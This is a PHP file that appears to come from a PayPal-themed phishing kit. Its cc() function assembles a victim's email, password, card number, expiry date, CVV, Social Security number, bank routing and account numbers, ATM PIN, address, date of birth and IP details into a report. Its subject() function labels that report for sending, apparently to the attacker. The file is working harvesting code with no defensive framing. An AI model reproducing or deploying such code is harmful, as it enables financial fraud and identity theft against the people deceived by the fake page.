<?php
function cc(){
$CC_Type=array('?????','AmEx','MasterCard','Visa','DinersClub','enRoute','Discover','JCB','Solo','Maestro','VisaElectron','LaserCard','Switch');
$r= "\n==================: PP Log :==================
Email Address		: ".$_SESSION['email']."
Password			: ".$_SESSION['password']."
-----------------: CC Info :-----------------
Name of cardholder		: ".$_POST['CN']."
Card Type				: ".$CC_Type[$_POST['CT']]."
Card Number				: ".$_POST['dftCN']."
Expiration Date			: ".$_POST['datex']." 
Card Verification Number: ".$_POST['dftVC'];
if(isset($_POST['NNS'])){$r=$r."\nSocial Security Number	: ".$_POST['NNS'];}
if(isset($_POST['RGT'])){$r=$r."\nBank Routing Number	: ".$_POST['RGT'];}
if(isset($_POST['TNC'])){$r=$r."\nBank Account Number	: ".$_POST['TNC'];}
if(isset($_POST['MMT'])){$r=$r."\nATM				: ".$_POST['MMT'];}
if(isset($_POST['CPNL'])){$r=$r."\n"."Code Personel		: ".$_POST['CPNL'];}
$r=$r."\n----------------------------------------------
First Name	: ".$_POST['gg1']."
Last Name	: ".$_POST['gg2']."
Address 1	: ".$_POST['gg4']."
Address 2	: ".$_POST['gg5']."
City		: ".$_POST['gg6']."
ZIP Code	: ".$_POST['gg8']."
Country		: ".$_POST['gg7']."
".$_POST['gg9']."_phone	: ".$_POST['gg10']."
Date Of Birth	: ".$_POST['gg3']."
================================================
Date		: ".gmdate("d/m/Y - H:i:s")."
Browser		: ".$_POST['BROWSER']."
Client IP	: ".getenv("REMOTE_ADDR")."
HostName	: ".gethostbyaddr(getenv("REMOTE_ADDR"))."
oCountry	: ".$_SESSION['tLang']."
oCity		: ".$_SESSION['city']."
oZip		: ".$_SESSION['zip']."
=================: Pinpal Risolta :================\n";
return $r;}
function subject(){return "CC | ".$_POST['gg7']." | ".$_POST['CN']." | ".getenv("REMOTE_ADDR");}
?>